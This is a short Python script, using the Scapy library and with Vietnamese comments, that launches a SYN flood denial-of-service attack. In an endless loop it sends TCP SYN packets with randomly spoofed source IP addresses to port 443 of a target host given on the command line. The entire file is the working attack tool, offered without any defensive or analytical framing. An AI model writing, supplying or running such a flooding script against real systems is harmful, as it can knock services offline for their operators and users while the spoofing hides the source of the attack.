import sys
import random
from scapy.all import IP, TCP, send

target_ip = sys.argv[1] if len(sys.argv) > 1 else "10.0.0.10"
target_port = 443

print(f"[*] Bắt đầu SYN Flood tấn công {target_ip}:{target_port} với IP giả mạo...")

try:
    while True:
        # Tạo IP nguồn giả mạo (Spoofed IP) ngẫu nhiên
        src_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        src_port = random.randint(1024, 65535)

        # Lắp ráp gói tin L3 (IP) và L4 (TCP với cờ 'S' - SYN)
        ip_layer = IP(src=src_ip, dst=target_ip)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        
        packet = ip_layer / tcp_layer
        
        # Gửi đi không cần chờ phản hồi (verbose=0 để tắt log làm chậm máy)
        send(packet, verbose=0)
except KeyboardInterrupt:
    print("\n[*] Đã dừng tấn công SYN Flood.")